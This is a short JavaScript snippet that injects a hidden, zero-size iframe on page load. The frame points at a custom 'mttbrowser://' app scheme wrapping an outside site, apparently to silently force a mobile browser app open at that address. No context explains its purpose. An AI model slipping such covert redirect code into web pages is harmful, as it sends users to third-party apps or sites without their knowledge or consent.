(function() {
    var li_ifr = document.createElement('IFRAME');
    li_ifr.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
    li_ifr.src = "mttbrowser://url=http://m.lmview.com/";
    li_ifr.setAttribute("scrolling", "no");
    li_ifr.sandbox = 'allow-scripts allow-forms allow-same-origin';
    document.body.appendChild(li_ifr)
}());